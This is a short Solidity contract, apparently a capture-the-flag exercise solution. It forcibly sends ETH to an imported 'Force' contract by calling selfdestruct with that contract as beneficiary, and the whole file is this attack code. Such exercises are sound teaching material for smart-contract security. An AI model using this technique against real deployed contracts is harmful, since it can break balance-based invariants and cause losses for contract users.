// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Force.sol";

// This contract will forcibly send ETH to the vulnerable contract.
contract ForceAttack {
    Force public vulnerableContract;

    // Initialize the attacker contract with the address of the vulnerable contract.
    constructor(address _vulnerableContract) {
        vulnerableContract = Force(payable(_vulnerableContract));
    }

    // Used to forcibly send ETH to the vulnerable contract.
    function attack() public payable {
        require(msg.value > 0);
        // Address for <selfdestruct> must be payable.
        address payable addressVulnerableContract = payable(address(vulnerableContract));
        selfdestruct(addressVulnerableContract);
    }
}
